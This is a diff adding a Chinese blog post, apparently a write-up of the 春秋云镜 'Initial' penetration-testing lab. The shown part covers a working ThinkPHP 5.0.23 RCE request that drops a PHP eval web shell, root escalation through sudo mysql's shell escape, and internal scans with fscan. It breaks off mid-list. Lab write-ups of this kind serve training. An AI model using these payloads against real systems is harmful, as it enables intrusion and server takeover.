@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="好久没打内网了，前阵子实习也没顾得上复习一下，另外加上某雀懒得充会员了，所以打算重新打一下然后把内容写到博客里面 考点 thinkphp 5.0.23 RCE  mysql命令提权  信呼文件上传nday  ms17-010(永恒之蓝)  DCSync   flag1fscan扫端口https:&#x2F;&#x2F;github.com&#x2F;shadow1ng&#x2F;fscan 1.&#x2F;fscan -h [host] -p 1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云镜Initial">
+<meta property="og:url" content="https://wanth3f1ag.top/2025/10/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/index.html">
+<meta property="og:site_name" content="root@wanth3f1ag">
+<meta property="og:description" content="好久没打内网了，前阵子实习也没顾得上复习一下，另外加上某雀懒得充会员了，所以打算重新打一下然后把内容写到博客里面 考点 thinkphp 5.0.23 RCE  mysql命令提权  信呼文件上传nday  ms17-010(永恒之蓝)  DCSync   flag1fscan扫端口https:&#x2F;&#x2F;github.com&#x2F;shadow1ng&#x2F;fscan 1.&#x2F;fscan -h [host] -p 1">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251023173632079.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251023173914849.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/1749472172091-35756bb4-3f37-42e8-ab66-e65c75b9eeec.webp">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251023175231478.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251023180224039.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251023180408492.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/1750329216655-cad2a2d0-d4c3-48be-9558-1f8b44995779.webp">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/1749474496748-f250558f-feae-48f9-a126-3b7b5f92569e.webp">
+<meta property="article:published_time" content="2025-10-23T09:24:17.000Z">
+<meta property="article:modified_time" content="2025-10-23T10:07:29.526Z">
+<meta property="article:author" content="wanTh3flag">
+<meta property="article:tag" content="Initial">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251023173632079.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>春秋云镜Initial</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">H0me</a></li><!--
+     --><!--
+       --><li><a href="/about/">A6out</a></li><!--
+     --><!--
+       --><li><a href="/tags/">T6gs</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Catagory</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">s4arch</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/3025/04/16/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/10/18/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFwp/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/10/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/10/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/&text=春秋云镜Initial"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/10/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/&title=春秋云镜Initial"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/10/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/&is_video=false&description=春秋云镜Initial"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=春秋云镜Initial&body=Check out this article: https://wanth3f1ag.top/2025/10/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/10/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/&title=春秋云镜Initial"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/10/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/&title=春秋云镜Initial"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/10/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/&title=春秋云镜Initial"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/10/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/&title=春秋云镜Initial"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/10/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/&name=春秋云镜Initial&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/10/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/&t=春秋云镜Initial"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%83%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">考点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag1"><span class="toc-number">2.</span> <span class="toc-text">flag1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fscan%E6%89%AB%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.1.</span> <span class="toc-text">fscan扫端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TPGUI%E4%B8%80%E6%8A%8A%E6%A2%AD"><span class="toc-number">2.2.</span> <span class="toc-text">TPGUI一把梭</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8getshell"><span class="toc-number">2.3.</span> <span class="toc-text">手动getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo%E6%8F%90%E6%9D%83"><span class="toc-number">2.4.</span> <span class="toc-text">sudo提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">内网穿透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag2"><span class="toc-number">4.</span> <span class="toc-text">flag2</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        春秋云镜Initial
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">wanTh3flag</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-10-23T09:24:17.000Z" class="dt-published" itemprop="datePublished">2025-10-23</time>
+        
+        (Updated: <time datetime="2025-10-23T10:07:29.526Z" class="dt-updated" itemprop="dateModified">2025-10-23</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/">春秋云镜</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Initial/" rel="tag">Initial</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>好久没打内网了，前阵子实习也没顾得上复习一下，另外加上某雀懒得充会员了，所以打算重新打一下然后把内容写到博客里面</p>
+<h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><ul>
+<li><p>thinkphp 5.0.23 RCE</p>
+</li>
+<li><p>mysql命令提权</p>
+</li>
+<li><p>信呼文件上传nday</p>
+</li>
+<li><p>ms17-010(永恒之蓝)</p>
+</li>
+<li><p>DCSync</p>
+</li>
+</ul>
+<h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><h3 id="fscan扫端口"><a href="#fscan扫端口" class="headerlink" title="fscan扫端口"></a>fscan扫端口</h3><p><a target="_blank" rel="noopener" href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h [host] -p 1-65535</span><br></pre></td></tr></table></figure>
+
+<p>我们扫一下机器开放的端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@VM-16-12-ubuntu:/opt# ./fscan -h 39.99.239.120  -p 1-65535</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /</span></span><br><span class="line"><span class="string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span></span><br><span class="line"><span class="string">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span></span><br><span class="line"><span class="string">                     fscan version: 1.8.4</span></span><br><span class="line"><span class="string">start infoscan</span></span><br><span class="line"><span class="string">39.99.239.120:22 open</span></span><br><span class="line"><span class="string">39.99.239.120:80 open</span></span><br><span class="line"><span class="string">[*] alive ports len is: 2</span></span><br><span class="line"><span class="string">start vulscan</span></span><br><span class="line"><span class="string">[*] WebTitle http://39.99.239.120      code:200 len:5578   title:Bootstrap Material Admin</span></span><br><span class="line"><span class="string">[+] PocScan http://39.99.239.120 poc-yaml-thinkphp5023-method-rce poc1</span></span><br><span class="line"><span class="string">已完成 2/2</span></span><br><span class="line"><span class="string">[*] 扫描结束,耗时: 43.475779494s</span></span><br></pre></td></tr></table></figure>
+
+<p>很明显了，扫出一个ThinkPHP 5.0.23版本的RCE漏洞CVE-2018-20062 <a target="_blank" rel="noopener" href="https://blog.csdn.net/cscscys/article/details/121792631">https://blog.csdn.net/cscscys/article/details/121792631</a></p>
+<p>访问出来是一个thinkphp框架，利用错误参数报错拿到thinkphp的版本</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251023173632079.png" alt="image-20251023173632079"></p>
+<h3 id="TPGUI一把梭"><a href="#TPGUI一把梭" class="headerlink" title="TPGUI一把梭"></a>TPGUI一把梭</h3><p>用ThinkPHPGUI工具直接打</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251023173914849.png" alt="image-20251023173914849"></p>
+<p>然后访问马子并用webshell工具连接就行<br>flag一般在root目录中，但是之前执行了whoami发现并不是root用户，无法访问root目录下的文件，所以需要提权</p>
+<h3 id="手动getshell"><a href="#手动getshell" class="headerlink" title="手动getshell"></a>手动getshell</h3><p>抓包构造请求</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/1749472172091-35756bb4-3f37-42e8-ab66-e65c75b9eeec.webp" alt="image.png"></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?s=captcha</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>39.99.239.120</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-oxygene">_method=__construct&amp;filter[]=system&amp;<span class="keyword">method</span>=<span class="title function_">get</span>&amp;<span class="title function_">server</span>[<span class="title function_">REQUEST_METHOD</span>]=<span class="title function_">whoami</span></span></span><br></pre></td></tr></table></figure>
+
+<p>有回显，那我们尝试写马</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?s=captcha</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>39.99.239.120</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-php-template"><span class="language-xml">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=echo+&quot;</span><span class="language-php"><span class="meta">&lt;?php</span>+@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><span class="language-xml">&quot;+&gt;1.php</span></span></span><br></pre></td></tr></table></figure>
+
+<p>然后访问马子并用蚁剑连接</p>
+<h3 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h3><p>先看一下当前用户能允许用sudo执行的命令规则</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑开虚拟终端运行一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(www-data:/var/www/html) $ <span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> www-data on ubuntu-web01:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line">User www-data may run the following commands on ubuntu-web01:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/mysql</span><br></pre></td></tr></table></figure>
+
+<p><code>www-data</code> 被允许以 <code>root</code> 身份运行 <code>/usr/bin/mysql</code>，并且 <strong>无需输入 sudo 密码</strong></p>
+<p>利用mysql去执行命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> mysql -e <span class="string">&#x27;\! /bin/sh&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>因为MySQL客户端支持 <code>\!</code> 或 <code>system</code> 命令来执行系统命令，所以我们这里启动一个shell，随后执行命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">(www-data:/var/www/html) $ <span class="built_in">sudo</span> mysql -e <span class="string">&#x27;\! /bin/sh&#x27;</span></span><br><span class="line">(www-data:/var/www/html) $ <span class="built_in">sudo</span> mysql -e <span class="string">&#x27;\! whoami&#x27;</span></span><br><span class="line">root</span><br><span class="line">(www-data:/var/www/html) $ <span class="built_in">sudo</span> mysql -e <span class="string">&#x27;\! ls /root&#x27;</span></span><br><span class="line">flag</span><br><span class="line">(www-data:/var/www/html) $ <span class="built_in">sudo</span> mysql -e <span class="string">&#x27;\! ls /root/flag&#x27;</span></span><br><span class="line">flag01.txt</span><br><span class="line">(www-data:/var/www/html) $ <span class="built_in">sudo</span> mysql -e <span class="string">&#x27;\! cat /root/flag/flag01.txt&#x27;</span></span><br><span class="line"> ██     ██ ██     ██       ███████   ███████       ██     ████     ██   ████████ </span><br><span class="line">░░██   ██ ░██    ████     ██░░░░░██ ░██░░░░██     ████   ░██░██   ░██  ██░░░░░░██</span><br><span class="line"> ░░██ ██  ░██   ██░░██   ██     ░░██░██   ░██    ██░░██  ░██░░██  ░██ ██      ░░ </span><br><span class="line">  ░░███   ░██  ██  ░░██ ░██      ░██░███████    ██  ░░██ ░██ ░░██ ░██░██         </span><br><span class="line">   ██░██  ░██ ██████████░██      ░██░██░░░██   ██████████░██  ░░██░██░██    █████</span><br><span class="line">  ██ ░░██ ░██░██░░░░░░██░░██     ██ ░██  ░░██ ░██░░░░░░██░██   ░░████░░██  ░░░░██</span><br><span class="line"> ██   ░░██░██░██     ░██ ░░███████  ░██   ░░██░██     ░██░██    ░░███ ░░████████ </span><br><span class="line">░░     ░░ ░░ ░░      ░░   ░░░░░░░   ░░     ░░ ░░      ░░ ░░      ░░░   ░░░░░░░░  </span><br><span class="line">Congratulations!!! You found the first flag, the next flag may be <span class="keyword">in</span> a server <span class="keyword">in</span> the internal network.</span><br><span class="line">flag01: flag&#123;60b53231-</span><br></pre></td></tr></table></figure>
+
+<p>成功拿到三分之一的flag</p>
+<h2 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h2><p>成功拿到这台机器的shell之后，我们就需要进行内网穿透以及横向了</p>
+<p>先上传一个fscan和stowaway</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251023175231478.png" alt="image-20251023175231478"></p>
+<p>chmod给权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x *</span><br></pre></td></tr></table></figure>
+
+<p>然后查看当前内网ip</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(www-data:/tmp) $ ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.22.1.15  netmask 255.255.0.0  broadcast 172.22.255.255</span><br><span class="line">        inet6 fe80::216:3eff:fe09:bf10  prefixlen 64  scopeid 0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">        ether 00:16:3e:09:bf:10  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 169704  bytes 151056377 (151.0 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 93070  bytes 7687167 (7.6 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 1068  bytes 97530 (97.5 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 1068  bytes 97530 (97.5 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>
+
+<p>用fscan扫一下内网ip</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 172.22.1.0/24</span><br></pre></td></tr></table></figure>
+
+<p>当前目录下生成了一个result.txt</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">172.22.1.2:88 open</span><br><span class="line">172.22.1.18:3306 open</span><br><span class="line">172.22.1.18:80 open</span><br><span class="line">172.22.1.21:445 open</span><br><span class="line">172.22.1.18:445 open</span><br><span class="line">172.22.1.15:80 open</span><br><span class="line">172.22.1.2:445 open</span><br><span class="line">172.22.1.15:22 open</span><br><span class="line">172.22.1.18:139 open</span><br><span class="line">172.22.1.2:139 open</span><br><span class="line">172.22.1.21:135 open</span><br><span class="line">172.22.1.18:135 open</span><br><span class="line">172.22.1.2:135 open</span><br><span class="line">172.22.1.21:139 open</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.1.21</span><br><span class="line">   [-&gt;]XIAORANG-WIN7</span><br><span class="line">   [-&gt;]172.22.1.21</span><br><span class="line">[+] MS17-010 172.22.1.21	(Windows Server 2008 R2 Enterprise 7601 Service Pack 1)</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.1.18</span><br><span class="line">   [-&gt;]XIAORANG-OA01</span><br><span class="line">   [-&gt;]172.22.1.18</span><br><span class="line">[*] OsInfo 172.22.1.2	(Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.1.2</span><br><span class="line">   [-&gt;]DC01</span><br><span class="line">   [-&gt;]172.22.1.2</span><br><span class="line">[*] NetBios 172.22.1.2      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] WebTitle http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin</span><br><span class="line">[*] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1</span><br><span class="line">[*] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600</span><br><span class="line">[*] WebTitle http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m=login</span><br><span class="line">[*] WebTitle http://172.22.1.18?m=login code:200 len:4012   title:信呼协同办公系统</span><br><span class="line">[+] PocScan http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
